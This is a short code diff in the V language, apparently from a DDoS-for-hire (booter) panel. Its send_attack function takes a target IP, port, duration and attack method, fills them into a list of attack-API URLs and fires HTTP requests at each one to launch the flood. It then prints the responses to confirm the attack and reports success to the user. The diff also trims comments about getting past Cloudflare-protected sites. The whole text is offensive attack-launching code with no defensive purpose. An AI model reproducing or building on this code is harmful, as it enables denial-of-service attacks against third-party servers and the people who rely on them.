@@ -20,13 +20,10 @@ pub fn (mut s API_Attack_Info) send_attack(usr string, ip string, port int, time
 				mut apis := api_c.apis_with_method(method) // this function return an array of APIs
 				// println(apis)
 				for api in apis { 
-					// this function 'fix_api()' takes the API and returns it replacing [host] [port] [time] [method] in API URL
-					// i might have to change this. This HTTP Web Request function sucks cawk with CLOUDFLARE protected sites
-					// might use C
 					mut f := http.get(s.fix_api(api, ip, port, time, method)) or { panic("Failed to send attack") }
 					println(f) // print response to make sure attack is going thru
 				}
-				attk_c.user_conn_up() // up the user on-going attk
+				// attk_c.user_conn_up() // up the user on-going attk
 				return "Attack successfully sent to ${ip}:${port} for ${time} with ${method}!\r\n"
 			} else {
 				return "[x] Error, The time you've enter for attack (${time}) is over you're max time. Try again with less the time\r\n"
